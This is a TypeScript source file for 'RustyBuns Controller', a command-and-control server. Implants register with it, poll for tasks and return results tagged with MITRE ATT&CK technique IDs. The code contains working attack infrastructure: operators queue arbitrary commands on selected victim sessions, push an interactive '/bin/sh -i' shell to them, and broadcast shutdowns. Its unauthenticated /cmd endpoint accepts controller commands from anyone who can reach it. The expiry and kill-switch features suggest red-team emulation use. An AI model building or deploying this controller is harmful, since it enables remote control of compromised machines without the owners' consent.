import { SessionManager } from "./session.ts";
import { taskEngine } from "./task.ts";
import { logTelemetrySessionRegister, logTelemetryTaskResult, logTelemetryShutdown, logTelemetrySessionStale } from "./telemetry.ts";

const PORT = parseInt(process.env.PORT ?? "8080");

const sessionManager = new SessionManager();

interface RegisterPayload {
  uuid: string;
  hostname: string;
  username: string;
  os: string;
  version: string;
  expiry_hours: number;
}

interface TaskResultPayload {
  task_id: string;
  success: boolean;
  output: string;
  error?: string;
  duration_ms: number;
  mitre_id?: string;
  technique?: string;
}

interface PendingTask {
  id: string;
  command: string;
  args?: string[];
}

const pendingTasks: Map<string, PendingTask[]> = new Map();

let selectedSession: string | null = null;
let globalShutdown = false;

const commands: Record<string, (args: string[]) => void> = {
  list: () => {
    sessionManager.list();
  },

  select: (args) => {
    if (args.length === 0) {
      console.error("Usage: select <session-id>");
      return;
    }
    const session = sessionManager.select(args[0]!);
    if (!session) {
      console.error(`Session ${args[0]} not found.`);
      return;
    }
    selectedSession = session.id;
    console.log(`[*] Selected session: ${session.id} (${session.username}@${session.hostname})`);
  },

  task: (args) => {
    if (args.length === 0) {
      console.error("Usage: task <command> [args...]");
      return;
    }
    if (!selectedSession) {
      console.error("No session selected. Use 'select <id>' first.");
      return;
    }

    const command = args[0]!;
    const cmdArgs = args.slice(1);
    const task = taskEngine.createTask(command, cmdArgs.length > 0 ? cmdArgs : undefined);

    const tasks = pendingTasks.get(selectedSession) ?? [];
    tasks.push({ id: task.id, command, args: cmdArgs.length > 0 ? cmdArgs : undefined });
    pendingTasks.set(selectedSession, tasks);

    console.log(`[*] Task queued: ${command} ${cmdArgs.join(" ") || ""} [${task.id}]`);
    console.log(`    Implant will pick it up on next beacon.`);
  },

  shell: (args) => {
    if (!selectedSession) {
      console.error("No session selected. Use 'select <id>' first.");
      return;
    }
    const session = sessionManager.select(selectedSession);
    if (!session) {
      console.error("Session not found.");
      return;
    }
    if (session.os !== "linux" && session.os !== "macos") {
      console.error(`PTY shell only supported on POSIX (linux/macos), not ${session.os}`);
      return;
    }
    const shellTask = taskEngine.createTask("shell", ["/bin/sh", "-i"]);
    const tasks = pendingTasks.get(selectedSession) ?? [];
    tasks.push({ id: shellTask.id, command: "shell", args: ["/bin/sh", "-i"] });
    pendingTasks.set(selectedSession, tasks);
    console.log(`[*] Interactive shell queued for ${selectedSession} [${shellTask.id}]`);
    console.log(`    NOTE: Full PTY streaming requires interactive controller CLI.`);
    console.log(`    Results will appear via /results endpoint.`);
  },

  tag: (args) => {
    if (args.length < 2) {
      console.error("Usage: tag <session-id> <label>");
      return;
    }
    sessionManager.tag(args[0]!, args[1]!);
  },

  exit: () => {
    console.log("[*] Shutting down controller...");
    process.exit(0);
  },

  shutdown: () => {
    globalShutdown = true;
    console.log("[!] Global shutdown signaled. All implants will halt on next beacon.");
    const sessions = sessionManager.getAll();
    for (const s of sessions) {
      const tasks = pendingTasks.get(s.id) ?? [];
      tasks.unshift({ id: "shutdown", command: "__shutdown" });
      pendingTasks.set(s.id, tasks);
      logTelemetryShutdown(s.id);
    }
  },

  "shutdown-all": () => {
    globalShutdown = true;
    console.log("[!] Global shutdown signaled. All implants will halt on next beacon.");
    const sessions = sessionManager.getAll();
    for (const s of sessions) {
      const tasks = pendingTasks.get(s.id) ?? [];
      tasks.unshift({ id: "shutdown", command: "__shutdown" });
      pendingTasks.set(s.id, tasks);
      logTelemetryShutdown(s.id);
    }
  },
};

function handleCommand(line: string) {
  const trimmed = line.trim();
  if (!trimmed) return;

  const parts = trimmed.split(/\s+/);
  const cmd = parts[0]!.toLowerCase();
  const args = parts.slice(1);

  const handler = commands[cmd];
  if (handler) {
    handler(args);
  } else {
    console.log(`Unknown command: ${cmd}. Type 'help' for available commands.`);
  }
}

const server = Bun.serve({
  port: PORT,
  async fetch(req) {
    const url = new URL(req.url);
    const path = url.pathname;

        if (req.method === "POST") {
      if (path === "/register") {
        try {
          const payload: RegisterPayload = await req.json();
          const session = sessionManager.register(payload);
          logTelemetrySessionRegister(session);
          return Response.json({ status: "ok", sessionId: session.id });
        } catch (e) {
          console.error("[!] Failed to parse register payload:", e);
          return Response.json({ status: "error", message: "invalid payload" }, { status: 400 });
        }
      }

      if (path.startsWith("/results/")) {
        const uuid = path.split("/")[2];
        try {
          const result: TaskResultPayload = await req.json();
          taskEngine.storeResult({
            task_id: result.task_id,
            success: result.success,
            output: result.output,
            error: result.error,
            duration_ms: result.duration_ms,
            mitre_id: result.mitre_id,
            technique: result.technique,
          });
          logTelemetryTaskResult({ ...result, session_id: uuid });
          return Response.json({ status: "ok" });
        } catch (e) {
          console.error("[!] Failed to parse result payload:", e);
          return Response.json({ status: "error" }, { status: 400 });
        }
      }

      if (path.startsWith("/tasks/")) {
        const uuid = path.split("/")[2];
        const body = await req.json().catch(() => null);
        if (body && Array.isArray(body.tasks)) {
          const session = sessionManager.select(uuid);
          if (session) {
            const tasks = pendingTasks.get(uuid) ?? [];
            for (const t of body.tasks) {
              tasks.push(t as PendingTask);
            }
            pendingTasks.set(uuid, tasks);
          }
        }
        return Response.json({ status: "ok" });
      }
    }

    if (req.method === "GET") {
      if (path.startsWith("/tasks/")) {
        const uuid = path.split("/")[2];
        const session = sessionManager.select(uuid);
        if (!session) {
          return Response.json({ tasks: [] }, { status: 404 });
        }
        sessionManager.touch(uuid);
        let tasks = pendingTasks.get(uuid) ?? [];
        pendingTasks.set(uuid, []);
        if (globalShutdown) {
          tasks.unshift({ id: "shutdown", command: "__shutdown" });
          globalShutdown = false;
        }
        return Response.json({ tasks });
      }

      if (path === "/shutdown") {
        return Response.json({ shutdown: globalShutdown });
      }
    }

    if (req.method === "POST" && path === "/cmd") {
      const body = await req.text();
      handleCommand(body);
      return Response.json({ status: "ok" });
    }

    return Response.json({ status: "not found" }, { status: 404 });
  },
});

console.log(`[+] RustyBuns Controller listening on port ${PORT} (HTTP)`);
console.log(`    Register endpoint: POST /register`);
console.log(`    Tasks endpoint:    GET  /tasks/<uuid>  — implant polls here`);
console.log(`    Tasks endpoint:    POST /tasks/<uuid>  — controller queues tasks`);
console.log(`    Results endpoint:  POST /results/<uuid>`);
console.log(`    Shell endpoint:    POST /cmd            — send controller commands`);
console.log(`    Stale check:      Every 60s (removes sessions with no beacon)`);
console.log(``);
sessionManager.startStaleCheck(60000, (session) => {
  logTelemetrySessionStale(session);
});
console.log(`\nSessions are created when implants register.`);
console.log(`Use curl to interact:\n`);
console.log(`  # Register a test session`);
console.log(`  curl -X POST http://localhost:${PORT}/register -H "Content-Type: application/json" -d '{"uuid":"test-123","hostname":"test-host","username":"testuser","os":"macos","version":"0.1.0","expiry_hours":8}'`);
console.log(`\n  # Send a task`);
console.log(`  curl -X POST http://localhost:${PORT}/tasks/test-123 -H "Content-Type: application/json" -d '{"tasks":[{"id":"abc","command":"whoami"}]}'`);
console.log(`\n  # List sessions (via controller shell)`);
console.log(`  curl -X POST http://localhost:${PORT}/cmd -d 'list'\n`);